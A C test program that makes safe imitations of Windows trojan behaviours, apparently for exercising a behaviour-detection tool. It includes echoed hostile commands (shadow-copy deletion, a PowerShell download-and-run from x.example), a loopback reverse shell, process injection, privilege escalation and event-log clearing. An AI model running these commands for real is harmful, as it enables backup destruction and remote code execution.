// What a trojan does, on Windows: one case per argument. Everything stays in a
// directory under %TEMP% or in HKCU\Software\LeakcheckTest, or is only attempted
// (a write that Windows refuses), so running it changes nothing that matters.
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

static char root[MAX_PATH];

static char *under(const char *rel, char *out) {
    snprintf(out, MAX_PATH, "%s\\%s", root, rel);
    return out;
}

static void make_root(void) {
    char t[MAX_PATH];
    GetTempPathA(sizeof t, t);
    snprintf(root, sizeof root, "%slcbeh", t);
    CreateDirectoryA(root, NULL);
}

static void mkdirs(const char *rel) {
    char p[MAX_PATH];
    under(rel, p);
    for (char *c = p + strlen(root) + 1; *c; ++c)
        if (*c == '\\') {
            *c = 0;
            CreateDirectoryA(p, NULL);
            *c = '\\';
        }
    CreateDirectoryA(p, NULL);
}

static void touch(const char *path, DWORD disposition, DWORD access) {
    HANDLE h = CreateFileA(path, access, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, disposition, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE)
        CloseHandle(h);
}

static HANDLE run(const char *line, STARTUPINFOA *si, BOOL inherit) {
    STARTUPINFOA local;
    PROCESS_INFORMATION pi;
    char cmd[1024];
    snprintf(cmd, sizeof cmd, "%s", line);
    if (!si) {
        memset(&local, 0, sizeof local);
        local.cb = sizeof local;
        si = &local;
    }
    if (!CreateProcessA(NULL, cmd, NULL, NULL, inherit, CREATE_NO_WINDOW, NULL, NULL, si, &pi))
        return NULL;
    CloseHandle(pi.hThread);
    return pi.hProcess;
}

static void run_wait(const char *line) {
    HANDLE p = run(line, NULL, FALSE);
    if (p) {
        WaitForSingleObject(p, 10000);
        CloseHandle(p);
    }
}

static void net(void) {
    WSADATA d;
    WSAStartup(MAKEWORD(2, 2), &d);
}

// ---- files

static void startup_folder(void) {
    char p[MAX_PATH];
    mkdirs("Start Menu\\Programs\\Startup");
    touch(under("Start Menu\\Programs\\Startup\\x.txt", p), CREATE_ALWAYS, GENERIC_WRITE);
}
static void startup_folder_read(void) {
    char p[MAX_PATH];
    mkdirs("Start Menu\\Programs\\Startup");
    touch(under("Start Menu\\Programs\\Startup\\x.txt", p), OPEN_EXISTING, GENERIC_READ);
}
static void credential_files(void) {
    char p[MAX_PATH];
    mkdirs(".ssh");
    touch(under(".ssh\\id_rsa", p), OPEN_EXISTING, GENERIC_READ);
    mkdirs("Microsoft\\Credentials");
    touch(under("Microsoft\\Credentials\\blob", p), OPEN_EXISTING, GENERIC_READ);
}
static void public_key(void) {
    char p[MAX_PATH];
    mkdirs(".ssh");
    touch(under(".ssh\\id_rsa.pub", p), OPEN_EXISTING, GENERIC_READ);
}
static void hosts_file(void) {
    touch("C:\\Windows\\System32\\drivers\\etc\\hosts", OPEN_EXISTING, GENERIC_WRITE);
}
static void system_file(void) {
    touch("C:\\Windows\\System32\\leakcheck_no_such_file.dll", OPEN_EXISTING, GENERIC_WRITE);
}
static void sam_database(void) {
    touch("C:\\Windows\\System32\\config\\SAM", OPEN_EXISTING, GENERIC_READ);
}
static void event_log_file(void) {
    touch("C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", TRUNCATE_EXISTING, GENERIC_WRITE);
}

// ---- registry

static void registry_run(const char *key) {
    HKEY k;
    char path[256];
    snprintf(path, sizeof path, "Software\\LeakcheckTest\\%s", key);
    if (RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &k, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(k, "x", 0, REG_SZ, (const BYTE *)"y", 2);
        RegCloseKey(k);
    }
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\LeakcheckTest");
}
static void run_key(void) { registry_run("Microsoft\\Windows\\CurrentVersion\\Run"); }
static void defender_key(void) { registry_run("Policies\\Microsoft\\Windows Defender"); }
static void ordinary_key(void) { registry_run("Settings"); }
static void registry_reads(void) {
    HKEY k;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &k) ==
        ERROR_SUCCESS)
        RegCloseKey(k);
}
static void sam_key(void) {
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &k) == ERROR_SUCCESS)
        RegCloseKey(k);
}

// ---- programs

static void write_payload(char *p) {
    HANDLE h;
    DWORD w;
    under("payload.bat", p);
    h = CreateFileA(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(h, "@exit 0\r\n", 9, &w, NULL);
    CloseHandle(h);
}
static void dropper_direct(void) {
    char p[MAX_PATH];
    write_payload(p);
    run_wait(p);
}
static void dropper_through_cmd(void) {
    char p[MAX_PATH], line[600];
    write_payload(p);
    snprintf(line, sizeof line, "cmd.exe /c \"%s\"", p);
    run_wait(line);
}
static void run_unwritten_file(void) {
    run_wait("cmd.exe /c exit 0");
}
static void shadow_copies(void) {
    run_wait("cmd.exe /c echo vssadmin delete shadows /all /quiet");
}
static void powershell_download(void) {
    run_wait("cmd.exe /c echo IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')");
}
static void masquerade_process(void) {
    char copy[MAX_PATH], line[600];
    under("svchost.exe", copy);
    CopyFileA("C:\\Windows\\System32\\cmd.exe", copy, FALSE);
    snprintf(line, sizeof line, "\"%s\" /c exit 0", copy);
    run_wait(line);
}
static void reverse_shell(void) {
    WSADATA d;
    SOCKET l, c, a;
    struct sockaddr_in addr;
    int len = sizeof addr;
    STARTUPINFOA si;
    HANDLE p;
    WSAStartup(MAKEWORD(2, 2), &d);
    l = socket(AF_INET, SOCK_STREAM, 0);
    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    bind(l, (struct sockaddr *)&addr, sizeof addr);
    listen(l, 1);
    getsockname(l, (struct sockaddr *)&addr, &len);
    c = socket(AF_INET, SOCK_STREAM, 0);
    connect(c, (struct sockaddr *)&addr, sizeof addr);
    a = accept(l, NULL, NULL);
    memset(&si, 0, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)a;
    p = run("cmd.exe /c exit 0", &si, TRUE);
    if (p) {
        WaitForSingleObject(p, 10000);
        CloseHandle(p);
    }
    closesocket(a);
    closesocket(c);
    closesocket(l);
}

// ---- other programs

static HANDLE victim(void) {
    char exe[MAX_PATH];
    GetModuleFileNameA(NULL, exe, sizeof exe);
    char cmd[MAX_PATH + 32];
    snprintf(cmd, sizeof cmd, "\"%s\" sleep", exe);
    return run(cmd, NULL, FALSE);
}
static void kill(HANDLE p) {
    TerminateProcess(p, 0);
    CloseHandle(p);
}
static void inject(void) {
    HANDLE p = victim();
    SIZE_T w;
    if (!p)
        return;
    LPVOID m = VirtualAllocEx(p, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (m)
        WriteProcessMemory(p, m, "x", 1, &w);
    kill(p);
}
static void read_process(void) {
    HANDLE p = victim();
    char b[4];
    SIZE_T r;
    if (!p)
        return;
    ReadProcessMemory(p, (LPCVOID)0x10000, b, sizeof b, &r);
    kill(p);
}
static void own_memory(void) {
    char b[4];
    SIZE_T r;
    ReadProcessMemory(GetCurrentProcess(), (LPCVOID)&b, b, sizeof b, &r);
}

// ---- hiding, privileges, logs

static void debugger(void) { IsDebuggerPresent(); }
static void privilege(void) {
    HANDLE t;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t))
        return;
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(t, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(t);
}
static void harmless_privilege(void) {
    HANDLE t;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t))
        return;
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = 0;
    AdjustTokenPrivileges(t, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(t);
}
static void event_log(void) { ClearEventLogA(NULL, NULL); }

// ---- the network

static void host_lookalike(void) {
    struct addrinfo *r = NULL;
    net();
    getaddrinfo("paypa1.com", NULL, NULL, &r);
    if (r)
        freeaddrinfo(r);
}
static void host_real(void) {
    struct addrinfo *r = NULL;
    net();
    getaddrinfo("localhost", NULL, NULL, &r);
    if (r)
        freeaddrinfo(r);
}
static void scan(int ports) {
    net();
    for (int i = 0; i < ports; i++) {
        struct sockaddr_in a;
        u_long nb = 1;
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        memset(&a, 0, sizeof a);
        a.sin_family = AF_INET;
        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        a.sin_port = htons((u_short)(40000 + i));
        ioctlsocket(s, FIONBIO, &nb);
        connect(s, (struct sockaddr *)&a, sizeof a);
        closesocket(s);
    }
}

// ---- ransomware

static void rename_many(int n, const char *ending) {
    mkdirs("files");
    for (int i = 0; i < n; i++) {
        char from[MAX_PATH], to[MAX_PATH], rel[64];
        snprintf(rel, sizeof rel, "files\\doc%d.txt", i);
        under(rel, from);
        snprintf(to, sizeof to, "%s%s", from, ending);
        touch(from, CREATE_ALWAYS, GENERIC_WRITE);
        MoveFileA(from, to);
    }
}

// ---- nothing out of the ordinary

static void ordinary(void) {
    char p[MAX_PATH], q[MAX_PATH];
    mkdirs("files");
    touch(under("files\\a.txt", p), CREATE_ALWAYS, GENERIC_WRITE);
    touch(p, OPEN_EXISTING, GENERIC_READ);
    MoveFileA(p, under("files\\b.txt", q));
    DeleteFileA(q);
    registry_reads();
    ordinary_key();
    run_wait("cmd.exe /c exit 0");
    host_real();
}

int main(int argc, char **argv) {
    make_root();
    for (int i = 1; i < argc; i++) {
        const char *c = argv[i];
        if (!strcmp(c, "sleep")) { Sleep(10000); return 0; }
        else if (!strcmp(c, "startup")) startup_folder();
        else if (!strcmp(c, "startup-read")) startup_folder_read();
        else if (!strcmp(c, "credentials")) credential_files();
        else if (!strcmp(c, "public-key")) public_key();
        else if (!strcmp(c, "hosts")) hosts_file();
        else if (!strcmp(c, "system-file")) system_file();
        else if (!strcmp(c, "sam-file")) sam_database();
        else if (!strcmp(c, "event-log-file")) event_log_file();
        else if (!strcmp(c, "run-key")) run_key();
        else if (!strcmp(c, "defender-key")) defender_key();
        else if (!strcmp(c, "sam-key")) sam_key();
        else if (!strcmp(c, "dropper")) dropper_direct();
        else if (!strcmp(c, "dropper-cmd")) dropper_through_cmd();
        else if (!strcmp(c, "not-a-dropper")) run_unwritten_file();
        else if (!strcmp(c, "shadow-copies")) shadow_copies();
        else if (!strcmp(c, "powershell")) powershell_download();
        else if (!strcmp(c, "masquerade")) masquerade_process();
        else if (!strcmp(c, "reverse-shell")) reverse_shell();
        else if (!strcmp(c, "inject")) inject();
        else if (!strcmp(c, "read-process")) read_process();
        else if (!strcmp(c, "own-memory")) own_memory();
        else if (!strcmp(c, "debugger")) debugger();
        else if (!strcmp(c, "privilege")) privilege();
        else if (!strcmp(c, "harmless-privilege")) harmless_privilege();
        else if (!strcmp(c, "event-log")) event_log();
        else if (!strcmp(c, "host-lookalike")) host_lookalike();
        else if (!strcmp(c, "scan")) scan(130);
        else if (!strcmp(c, "scan-few")) scan(10);
        else if (!strcmp(c, "ransom")) rename_many(25, ".locked");
        else if (!strcmp(c, "ransom-few")) rename_many(10, ".locked");
        else if (!strcmp(c, "ransom-backup")) rename_many(25, ".bak");
        else if (!strcmp(c, "ordinary")) ordinary();
        else {
            fprintf(stderr, "unknown case %s\n", c);
            return 64;
        }
    }
    return 0;
}
